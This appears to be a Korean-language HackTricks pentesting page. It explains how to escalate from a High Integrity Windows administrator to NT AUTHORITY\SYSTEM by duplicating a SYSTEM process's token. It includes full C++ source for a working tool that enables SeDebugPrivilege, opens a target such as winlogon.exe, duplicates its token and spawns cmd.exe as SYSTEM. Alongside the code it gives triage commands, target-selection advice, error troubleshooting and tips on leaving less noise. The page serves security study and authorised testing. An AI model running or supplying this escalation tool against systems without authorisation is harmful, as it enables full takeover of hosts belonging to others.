# SeImpersonate from High To System

{{#include ../../banners/hacktricks-training.md}}

이 페이지에서는 **High Integrity administrator process**에서 **보호되지 않은 SYSTEM process를 열고, 해당 process의 token을 duplicate한 다음, 그 token으로 child process를 생성**하여 **`NT AUTHORITY\SYSTEM`**으로 전환하는 **manual** 방법을 설명합니다.

**`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`**만 보유하고 있으며 **적절한 SYSTEM process를 열 수 없는 경우**, 일반적으로 **Potato / named-pipe** 경로가 더 안정적입니다:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

원하는 것이 단순히 `SYSTEM`이 아니라 가능한 한 많은 privilege를 가진 **SYSTEM token**이라면 다음 문서도 확인하세요:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## 빠른 triage

token을 탈취하기 전에 먼저 context를 빠르게 확인하세요:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
실전 참고 사항:

- **High Integrity** admin token은 일반적으로 **`SeDebugPrivilege`를 enable**하고 보호되지 않은 많은 SYSTEM 프로세스를 열기에 충분합니다.
- **`CreateProcessWithTokenW`는 caller에 **`SeImpersonatePrivilege`**가 필요합니다. 해당 API가 `1314`와 함께 실패하면, 이미 SYSTEM primary token을 duplicate한 후 **`CreateProcessAsUserW`**로 전환하세요.
- 최신 Windows에서는 **LSA protection / PPL**이 **`SeDebugPrivilege`**를 가진 관리자도 access하지 못하도록 차단하므로 **`lsass.exe`**가 좋지 않은 target인 경우가 많습니다. 대신 SYSTEM으로 실행 중인 **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** 또는 초기 **`svchost.exe`**를 우선 사용하세요.
- 모든 SYSTEM 프로세스가 똑같이 유용한 token을 제공하는 것은 아닙니다. SYSTEM을 얻었지만 일부 privilege가 없다는 것을 확인했다면 technique이 고장 났다고 판단하지 말고 다른 SYSTEM 프로세스를 시도하세요.

## PID를 신중하게 선택하기

이 작업을 안정적으로 수행하는 가장 쉬운 방법은 **DACL이 실제로 Administrators가 해당 프로세스를 query하고 token을 duplicate하는 것을 허용하는 SYSTEM 프로세스를 선택하는 것**입니다.

먼저 테스트하기 좋은 후보:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- SYSTEM으로 실행 중인 일부 초기 `svchost.exe` 인스턴스

기본적으로 피할 대상:

- **RunAsPPL / LSA protection**이 활성화된 호스트의 `lsass.exe`
- **`SeDebugPrivilege`를 enable한 후에도 `Access denied`를 반환하는 protected / security-sensitive 프로세스**

관리자 권한으로 실행한 **Process Explorer** 또는 **Process Hacker**를 사용해 후보 프로세스와 해당 token/ACL을 확인할 수 있습니다.

### Code

다음 code는 [이 access-token article](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)에서 가져온 것입니다. **process ID를 argument로 받고**, 해당 프로세스의 **user로 command shell을 시작합니다**.<sup>[[3]](#references)</sup>\
High Integrity 프로세스에서 실행하면 **System으로 실행 중인 프로세스의 PID**(`winlogon`, `wininit` 등)를 **지정하고**, SYSTEM으로 `cmd.exe`를 실행할 수 있습니다.<sup>[[3]](#references)</sup>
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## 유용한 API / access-right 참고 사항

이 sample은 `MAXIMUM_ALLOWED`를 사용하지만, 실제 작업에서는 관련된 최소 구성 요소를 기억해 두는 것이 유용합니다:

- `OpenProcessToken()`에는 **`PROCESS_QUERY_LIMITED_INFORMATION`**으로 process handle을 연 경우만 필요합니다.
- `CreateProcessWithTokenW()`를 사용하려면 **primary token handle**에 **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**가 있어야 합니다.<sup>[[1]](#references)</sup>
- `DuplicateTokenEx()`는 impersonation token만이 아니라 **primary token**(`TokenPrimary`)을 생성해야 합니다.
- 이미 SYSTEM으로 impersonate했는데도 `CreateProcessWithTokenW()`가 `1314`와 함께 계속 실패하면 대신 `CreateProcessAsUserW()`를 시도하세요.

즉, token을 query하는 데 필요한 권한만 요청하는 것보다 target process를 `PROCESS_ALL_ACCESS`로 여는 것은 일반적으로 불필요하며 더 많은 noise를 남깁니다.

## 오류

경우에 따라 System을 impersonate하려고 시도해도 작동하지 않으며 다음과 같은 output이 표시될 수 있습니다:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
이는 High Integrity level에서 실행 중이더라도 해당 대상 process/token에 대한 **권한이 충분하지 않다**는 의미입니다.\
**Process Explorer**를 사용하여 `svchost.exe` process에 대한 현재 Administrator 권한을 확인해 보겠습니다(또는 **Process Hacker**를 사용할 수도 있습니다).

1. `svchost.exe` process를 선택합니다.
2. Right Click --> Properties
3. "Security" Tab에서 오른쪽 아래에 있는 "Permissions" 버튼을 클릭합니다.
4. "Advanced"를 클릭합니다.
5. "Administrators"를 선택하고 "Edit"를 클릭합니다.
6. "Show advanced permissions"를 클릭합니다.

![Code - Error: 6. "Show advanced permissions" 클릭](<../../images/image (437).png>)

이전 이미지에는 선택한 process에 대해 "Administrators"가 보유한 모든 privileges가 포함되어 있습니다(`svchost.exe`의 경우 볼 수 있듯이 "Query" privileges만 보유합니다).

"Administrators"가 `winlogon.exe`에 대해 보유한 privileges를 확인해 보겠습니다.

![Code - Error: "Administrators"가 winlogon.exe에 대해 보유한 privileges 확인](<../../images/image (1102).png>)

해당 process 내부에서 "Administrators"는 "Read Memory" 및 "Read Permissions"를 수행할 수 있으며, 이는 Administrators가 이 process에서 사용하는 token을 impersonate할 수 있도록 해줄 가능성이 있습니다.

### 일반적인 실패 원인

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: process DACL이 접근을 차단하거나 대상이 **protected/PPL** 상태입니다. 다른 SYSTEM process를 선택하세요.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: token handle을 충분한 rights 없이 열었거나, 대상 token DACL이 duplication을 차단합니다.
- **`CreateProcessWithTokenW()` -> `1314`**: caller에서 현재 **`SeImpersonatePrivilege`**가 활성화되어 있지 않습니다. 먼저 활성화를 시도하거나, duplicated primary token을 사용하여 `CreateProcessAsUserW()`를 사용하세요.
- 이전 실패 후 **`CreateProcessWithTokenW()` -> `1326`**: 이는 대개 이전 token duplication/impersonation 단계가 실패하여 child process를 실행할 사용 가능한 primary token이 없다는 의미입니다.

## Operator notes

- 이 technique은 이미 **local admin + high integrity** 상태이고, service나 named-pipe coercion chain을 구성하지 않고 SYSTEM으로 빠르게 수동 escalation하려는 경우 유용합니다.
- 강화된 Windows 11 / Server 환경에서는 **LSA protection이 점점 일반화되고 있으므로**, `lsass.exe`가 항상 readable하다고 가정하는 workflow는 취약합니다. **`winlogon.exe` / `wininit.exe` / `services.exe`를 일반적으로 먼저 선택하는 편이 더 좋습니다**.<sup>[[2]](#references)</sup>
- 권한이 상승된 admin desktop이 아닌 **service account** context를 확보한 경우에는 이 페이지의 방법보다 **Potato family**가 일반적으로 더 적합합니다.



## References

- [1] [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [SensePost: LSASS를 건드리지 않고 Windows token을 악용하여 Active Directory 손상시키기](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
- [3] [Process Token 이해 및 악용 — Part II](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)
{{#include ../../banners/hacktricks-training.md}}
